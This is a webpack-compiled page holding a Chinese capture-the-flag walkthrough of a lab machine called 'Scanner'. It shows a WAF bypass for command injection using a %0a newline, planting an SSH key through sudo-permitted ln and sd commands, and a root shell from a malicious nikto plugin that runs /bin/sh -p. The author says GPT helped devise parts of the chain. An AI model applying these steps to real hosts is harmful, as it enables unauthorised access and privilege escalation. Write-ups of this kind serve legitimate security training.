(window.webpackJsonp=window.webpackJsonp||[]).push([[133],{489:function(s,a,e){"use strict";e.r(a);var t=e(8),n=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"信息收集"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#信息收集"}},[s._v("#")]),s._v(" 信息收集")]),s._v(" "),a("p",[s._v("扫描")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("nmap -p- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.106\nPORT     STATE SERVICE VERSION\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("/tcp   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("     OpenSSH "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v(".0p2 Debian "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("protocol "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2.0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("/tcp   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  http    nginx "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.18")]),s._v(".0\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8080")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  http    Apache httpd "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2.4")]),s._v(".65 "),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("((")]),s._v("Debian"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("))")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("ul",[a("li",[s._v("80： nginx")]),s._v(" "),a("li",[s._v("8080：apache")])]),s._v(" "),a("p",[s._v("80端口 首页内容")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/2.png",alt:""}})]),s._v(" "),a("p",[s._v("扫描目录")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/1.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"命令执行"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#命令执行"}},[s._v("#")]),s._v(" 命令执行")]),s._v(" "),a("p",[s._v("没发现东西，看下8080端口，输入ip，后台执行ping命令")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/3.png",alt:""}})]),s._v(" "),a("p",[s._v("直接输入命令或使用"),a("code",[s._v(";|&")]),s._v("等命令分隔符尝试闭合ping命令时都会命中waf，使用%0a换行时，可以正常执行命令")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/4.png",alt:""}})]),s._v(" "),a("p",[s._v("写入webshell失败，看看可写目录，webshell无缘")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" / "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-type")]),s._v(" d "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-writable")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-print")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("可写目录\n/run/php\n/run/lock\n/dev/mqueue\n/dev/shm\n/tmp\n/proc/1998/task/1998/fd\n/proc/1998/fd\n/proc/1998/map_files\n/var/tmp\n/var/lib/php/sessions\n/var/cache/apache2/mod_cache_disk\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br")])]),a("p",[s._v("tmp目录下的文件没有执行权限")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/5.png",alt:""}})]),s._v(" "),a("p",[s._v("查找可用suid命令")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/Scanner/6.png",alt:""}})]),s._v(" "),a("p",[s._v("www-data用户可以以welcome用户身份ln,sd命令")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("User www-data may run the following commands on Scanner:\n    (welcome) NOPASSWD: /usr/bin/ln\n    (welcome) NOPASSWD: /usr/bin/sd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("sd命令读取文件，正则匹配所有文件内容，并显示出来")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" welcome /usr/bin/sd "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'(.*)'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'$1'")]),s._v(" /home/welcome/user.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("user：flag{user-3e9f21e4b361d449054557d2a8fbde9e}")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/7.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"welcome登录"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#welcome登录"}},[s._v("#")]),s._v(" welcome登录")]),s._v(" "),a("p",[s._v("现在问题是给的ln,sd命令只用了sd，站在出题人角度，既然给了两个ln,sd命令，应该都会用到，经过拷打GPT，找到了一种写入密钥的方案，听我给你慢慢道来")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/8.png",alt:""}})]),s._v(" "),a("p",[s._v("首先，要确保.bashrc文件存在，非空。如果是空文件，sd命令无法替换文件里的内容了。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" welcome /usr/bin/sd "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'(.*)'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'$1'")]),s._v(" /home/welcome/.bashrc\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/Scanner/9.png",alt:""}})]),s._v(" "),a("p",[s._v("下载远程公钥到tmp目录")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://192.168.56.1/pentest.pub "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" /tmp/1.pub\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/Scanner/10.png",alt:""}})]),s._v(" "),a("p",[s._v("使用ln命令，创建软连接、硬链接")]),s._v(" "),a("p",[s._v("软链接可以指向文件和目录，硬链接只能指向文件")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/11.png",alt:""}})]),s._v(" "),a("p",[s._v("不确定welcome用户是否存在.ssh目录以及authorized_keys文件")]),s._v(" "),a("ul",[a("li",[s._v("/home/welcome 存在")]),s._v(" "),a("li",[s._v("/home/welcome/.bashrc 存在")]),s._v(" "),a("li",[s._v("/home/welcome/.ssh 可能不存在")]),s._v(" "),a("li",[s._v("/home/welcome/.ssh/authorized_keys 可能不存在")])]),s._v(" "),a("p",[s._v("创建.ssh的软链接，指向/home/welcome目录")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" welcome /usr/bin/ln "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sfn")]),s._v(" /home/welcome /home/welcome/.ssh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("修改.bashrc文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" welcome /usr/bin/sd "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" s "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'.*'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /tmp/1.pub"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v(")")])]),s._v('"')]),s._v(" /home/welcome/.bashrc\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("再次查看.bashrc内容")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" welcome /usr/bin/sd "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'(.*)'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'$1'")]),s._v(" /home/welcome/.bashrc\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/Scanner/12.png",alt:""}})]),s._v(" "),a("p",[s._v("创建authorized_keys的硬链接，指向/home/welcome/.bashrc")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" welcome /usr/bin/ln "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" /home/welcome/.bashrc /home/welcome/.ssh/authorized_keys\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("查看/home/welcome/.ssh/authorized_keys内容")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" welcome /usr/bin/sd "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'(.*)'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'$1'")]),s._v(" /home/welcome/.ssh/authorized_keys\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("密钥成功写入")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/13.png",alt:""}})]),s._v(" "),a("p",[s._v("在整个流程，都是以welcome用户身份进行的链接操作，公钥所有者是welcome，无需进行chmod进行权限控制")]),s._v(" "),a("p",[s._v("ssh登录")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" welcome@192.168.56.102 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-i")]),s._v(" pentest\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/Scanner/14.png",alt:""}})]),s._v(" "),a("p",[s._v("然后就可以发现welcome下有密码文件pass.txt，"),a("s",[s._v("我不难过")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/15.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"root提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#root提权"}},[s._v("#")]),s._v(" root提权")]),s._v(" "),a("p",[s._v("welcome有suid命令/usr/bin/nikto")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("welcome@Scanner:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v("\nMatching Defaults entries "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" welcome on Scanner:\n    env_reset, mail_badpass,\n    "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("secure_path")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/usr/local/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/local/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/bin\n\nUser welcome may run the following commands on Scanner:\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ALL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" NOPASSWD: /usr/bin/nikto\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("帮助文档")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("welcome@Scanner:~$ /usr/bin/nikto "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v("\nOption "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v(" requires an argument\n\n       -config+            Use this config "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v("\n       -Display+           Turn on/off display outputs\n       "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-dbcheck")]),s._v("            check database and other key files "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" syntax errors\n       -Format+            save "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("-o"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("format")]),s._v("\n       "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Help")]),s._v("               Extended "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("help")]),s._v(" information\n       -host+              target "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v("\n       -id+                Host authentication to use, "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("format")]),s._v(" is id:pass or id:pass:realm\n       -list-plugins       List all available plugins\n       -output+            Write output to this "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v("\n       "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-nossl")]),s._v("              Disables using SSL\n       "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-no404")]),s._v("              Disables "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("404")]),s._v(" checks\n       -Plugins+           List of plugins to run "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("default: ALL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n       -port+              Port to use "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("default "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n       -root+              Prepend root value to all requests, "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("format")]),s._v(" is /directory\n       "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-ssl")]),s._v("                Force ssl mode on port\n       -Tuning+            Scan tuning\n       -timeout+           Timeout "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" requests "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("default "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v(" seconds"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n       "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-update")]),s._v("             Update databases and plugins from CIRT.net\n       "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Version")]),s._v("            Print plugin and database versions\n       -vhost+             Virtual "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("for Host header"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n                + requires a value\n\n        Note: This is the short "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("help")]),s._v(" output. Use "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-H")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" full "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("help")]),s._v(" text.\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br")])]),a("p",[s._v("拷打gpt写了一个恶意插件，启动nikto时会给出一个root shell")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("# AI\n可以使用-config参数指定配置文件，其中的 PLUGINDIR 决定插件目录 ，我们放一个最小恶意插件到 /tmp，并指定加载它即可。\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("写入恶意插件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'BEGIN { exec \"/bin/sh\"; }\\n1;\\n'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /tmp/pwn.plugin\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("自定义配置文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'PLUGINDIR=/tmp\\n'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /tmp/nikto.conf\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("启动nikto")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" /usr/bin/nikto "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-config")]),s._v(" /tmp/nikto.conf "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Plugins")]),s._v(" pwn "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("启动时报错"),a("code",[s._v("Could not work out the nikto EXECDIR")]),s._v("，找不到执行目录，要在配置文件中指定")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/16.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'BEGIN { exec \"/bin/sh -p\"; }\\n1;\\n'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /tmp/pwn.plugin\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'EXECDIR=/usr/share/nikto\\nPLUGINDIR=/tmp\\nDBDIR=/usr/share/nikto/databases\\nTEMPLATEDIR=/usr/share/nikto/templates\\n'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /tmp/nikto.conf\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" /usr/bin/nikto "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-config")]),s._v(" /tmp/nikto.conf "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Plugins")]),s._v(" pwn "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("又报错，/tmp目录找不到核心插件")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/Scanner/17.png",alt:""}})]),s._v(" "),a("p",[s._v("把恶意插件命名为核心插件即可")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'BEGIN { exec \"/bin/sh -p\"; }\\n1;\\n'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /tmp/nikto_core.plugin\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'EXECDIR=/usr/share/nikto\\nPLUGINDIR=/tmp\\nDBDIR=/usr/share/nikto/databases\\nTEMPLATEDIR=/usr/share/nikto/templates\\n'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /tmp/nikto.conf\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" /usr/bin/nikto "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-config")]),s._v(" /tmp/nikto.conf "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1\n")])]),s._v(" 